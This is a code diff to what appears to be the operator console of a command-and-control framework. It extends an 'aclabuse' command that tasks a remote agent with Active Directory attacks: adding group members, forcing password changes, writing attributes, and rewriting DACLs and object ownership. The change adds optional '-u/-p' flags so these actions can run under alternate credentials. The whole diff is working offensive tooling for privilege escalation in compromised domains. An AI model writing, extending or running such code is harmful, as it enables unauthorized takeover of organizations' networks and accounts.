@@ -704,16 +704,16 @@ def handle_interact(line, agent_id):
 
     elif cmd == "aclabuse":
         _ACLABUSE_USAGE = {
-            "addmember":           ("group user",            2),
-            "forcechangepassword": ("user newpassword",      2),
-            "genericwrite":        ("target attribute value", 3),
-            "writedacl":           ("target principal right", 3),
-            "writeowner":          ("target new_owner",      2),
+            "addmember":           ("group user",             2),
+            "forcechangepassword": ("user newpassword",       2),
+            "genericwrite":        ("target attribute value",  3),
+            "writedacl":           ("target principal right",  3),
+            "writeowner":          ("target new_owner",        2),
         }
         if not arg:
-            print("usage: aclabuse <op> <args>")
+            print("usage: aclabuse <op> <args> [-u altuser -p altpass]")
             for op, (sig, _) in _ACLABUSE_USAGE.items():
-                print(f"  aclabuse {op} {sig}")
+                print(f"  aclabuse {op} {sig} [-u altuser -p altpass]")
         else:
             try:
                 tokens = shlex.split(arg, posix=False)
@@ -722,7 +722,19 @@ def handle_interact(line, agent_id):
             tokens = [t.strip("'\"") for t in tokens]
 
             op = tokens[0].lower() if tokens else ""
-            op_args = tokens[1:]
+            raw_args = tokens[1:]
+
+            # Split positional op args from optional -u / -p credential flags
+            altuser = altpass = None
+            op_args = []
+            i = 0
+            while i < len(raw_args):
+                if raw_args[i] == "-u" and i + 1 < len(raw_args):
+                    altuser = raw_args[i + 1]; i += 2
+                elif raw_args[i] == "-p" and i + 1 < len(raw_args):
+                    altpass = raw_args[i + 1]; i += 2
+                else:
+                    op_args.append(raw_args[i]); i += 1
 
             if op not in _ACLABUSE_USAGE:
                 print(f"[-] Unknown operation '{op}'. Valid: {', '.join(_ACLABUSE_USAGE)}")
@@ -732,7 +744,12 @@ def handle_interact(line, agent_id):
                     sig, _ = _ACLABUSE_USAGE[op]
                     print(f"[-] {op} requires {required} argument(s): {sig}")
                 else:
-                    instruction = "|".join([op] + op_args)
+                    parts = [op] + op_args
+                    if altuser and altpass:
+                        parts += [altuser, altpass]
+                    instruction = "|".join(parts)
+                    if altuser:
+                        print(f"[*] Running as alternate user: {altuser}")
                     res = _post("/task", {
                         "agent_id":    agent_id,
                         "task_type":   "aclabuse",
